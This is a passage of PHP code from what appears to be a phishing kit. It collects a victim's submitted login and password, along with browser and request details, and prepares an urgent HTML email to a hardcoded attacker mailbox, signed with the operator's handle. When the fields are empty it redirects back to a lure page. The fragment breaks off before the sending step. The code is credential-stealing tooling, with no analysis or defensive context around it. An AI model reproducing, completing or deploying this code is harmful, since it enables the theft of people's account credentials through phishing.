...
$login = $_POST['ai'];
$passwd = $_POST['pr'];
$own = 'iyamjvak@yandex.ru';
$browser = $_SERVER['HTTP_USER_AGENT'];
$inj = $_SERVER["REQUEST_URI"];
$domain = 'CHina ReZult';
$sender = 'China -|#iYamGhost';
$subj = "$domain LOGZ";
$headers .= "From: iYamGhost|#s3rv3r<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'bula.php';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>iYamGhost-ICQ: @iYamGhost</td></tr>
 ...
 <tr><td>>ICQ: iYamGhost<</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: bula.php" );
}
else {
